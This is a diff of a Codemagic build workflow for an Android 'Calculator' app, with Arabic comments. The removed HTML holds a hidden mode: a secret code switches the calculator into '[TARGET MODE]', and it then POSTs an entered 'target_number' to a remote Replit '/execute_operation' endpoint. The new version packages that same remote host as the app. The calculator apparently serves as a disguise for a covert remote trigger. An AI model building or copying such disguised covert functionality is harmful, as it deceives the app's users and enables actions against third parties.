@@ -1,112 +1,28 @@
 workflows:
   android-build:
     name: Android Build
-    environment:
-      package_name: com.hassan.calculator
-      app_name: "Calculator"
     scripts:
-      - name: Create WebView App from local HTML
+      - name: Build Web to APK
         script: |
-          # الخطوة 1: تثبيت أداة ويب فيو
-          npm install -g webview-cli
+          # 1. استنساخ الأداة كما كنت تفعل
+          git clone https://github.com/Jipok/website-to-apk.git
+          cd website-to-apk
 
-          # الخطوة 2: إنشاء مجلد المشروع
-          mkdir -p app/www
-          
-          # الخطوة 3: إنشاء ملف index.html ووضع الكود الخاص بك فيه
-          cat > app/www/index.html << EOF
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>Calculator</title>
-    <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #000; margin: 0; display: flex; justify-content: center; align-items: flex-end; height: 100vh; }
-        .calculator { width: 100%; max-width: 420px; background-color: #000; display: flex; flex-direction: column; height: 100%; }
-        .display { color: #fff; font-size: 10vh; font-weight: 300; text-align: right; padding: 0 30px; flex-grow: 1; display: flex; justify-content: flex-end; align-items: flex-end; overflow: hidden; white-space: nowrap; }
-        .keypad { display: grid; grid-template-columns: repeat(4, 1fr); grid-template-rows: repeat(5, 1fr); gap: 14px; padding: 20px; height: 65vh; }
-        .key { background-color: #333; color: #fff; font-size: 2rem; font-weight: 400; border: none; border-radius: 50px; cursor: pointer; }
-        .key:active { background-color: #737373; }
-        .key.light-gray { background-color: #a5a5a5; color: #000; }
-        .key.light-gray:active { background-color: #d9d9d9; }
-        .key.orange { background-color: #f1a33c; }
-        .key.orange:active { background-color: #f9c68a; }
-        .key.zero { grid-column: span 2; text-align: left; padding-left: 32px; }
-    </style>
-</head>
-<body>
-    <div class="calculator">
-        <div id="display" class="display">0</div>
-        <div class="keypad">
-            <button class="key light-gray" id="clear">C</button><button class="key light-gray">+/-</button><button class="key light-gray">%</button><button class="key orange">÷</button>
-            <button class="key">7</button><button class="key">8</button><button class="key">9</button><button class="key orange">×</button>
-            <button class="key">4</button><button class="key">5</button><button class="key">6</button><button class="key orange">-</button>
-            <button class="key">1</button><button class="key">2</button><button class="key">3</button><button class="key orange">+</button>
-            <button class="key zero">0</button><button class="key">.</button><button class="key orange" id="equals">=</button>
-        </div>
-    </div>
-    <script>
-        const display = document.getElementById('display');
-        const keys = document.querySelector('.keypad');
-        const secretCode = '1990';
-        let targetMode = false;
-        const API_ENDPOINT = 'https://a51702dd-1333-42b7-8ff6-d744c8b30488-00-2wna80bpuhr6a.kirk.replit.dev/execute_operation';
-        keys.addEventListener('click', e => {
-            if (!e.target.matches('button')) return;
-            const key = e.target;
-            const action = key.textContent;
-            let displayedNum = display.textContent;
-            if (action === 'C') {
-                display.textContent = '0';
-                targetMode = false;
-                display.style.color = '#fff';
-                return;
-            }
-            if (action === '=') {
-                if (displayedNum === secretCode) {
-                    targetMode = true;
-                    display.style.color = '#ff3c3c';
-                    display.textContent = '[TARGET MODE]';
-                } else if (targetMode) {
-                    const targetNumber = displayedNum;
-                    display.textContent = 'EXECUTING...';
-                    fetch(API_ENDPOINT, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ target_number: targetNumber })
-                    }).catch(err => console.error(err));
-                    setTimeout(() => {
-                        display.textContent = '0';
-                        targetMode = false;
-                        display.style.color = '#fff';
-                    }, 3000);
-                } else {
-                    try { display.textContent = eval(displayedNum.replace(/×/g, '*').replace(/÷/g, '/')); } catch { display.textContent = 'Error'; }
-                }
-                return;
-            }
-            if (targetMode && displayedNum === '[TARGET MODE]') {
-                 display.textContent = action;
-            } else if (displayedNum === '0' && action !== '.') {
-                display.textContent = action;
-            } else {
-                if (display.textContent.length < 15) {
-                    display.textContent += action;
-                }
-            }
-        });
-    </script>
-</body>
-</html>
-EOF
+          # 2. بناء التطبيق باستخدام رابط Replit العام. هذا ضروري ليعمل التطبيق.
+          ./gradlew assembleDebug -PappUrl="https://a51702dd-1333-42b7-8ff6-d744c8b30488-00-2wna80bpuhr6a.kirk.replit.dev" -PappName="Calculator" -PpackageName="com.hassan.calculator"
 
-          # الخطوة 4: بناء ملف APK من المجلد المحلي
-          webview-cli --name="$app_name" --package="$package_name" --url="app/www" --fullscreen --output="app.apk"
-          
-          # الخطوة 5: نسخ ملف APK إلى مخرجات Codemagic
+          # 3. نسخ ملف APK الناتج إلى مجلد المخرجات الخاص بـ Codemagic
           mkdir -p $CM_ARTIFACT_PATH
-          cp app.apk $CM_ARTIFACT_PATH/
+          cp app/build/outputs/apk/debug/app-debug.apk $CM_ARTIFACT_PATH/hassan-calculator.apk
 
+    # 4. إخبار Codemagic بأن هناك ملفات ناتجة ليتم حفظها
     artifacts:
       - $CM_ARTIFACT_PATH/*.apk
+
+    # 5. (اختياري) إرسال الملف الناتج إلى بريدك الإلكتروني بالطريقة الرسمية
+    publishing:
+      email:
+        recipients:
+          - alkingbibi27@gmail.com # يمكنك وضع بريدك هنا
+        notify:
+          success: true # إرسال فقط عند النجاح
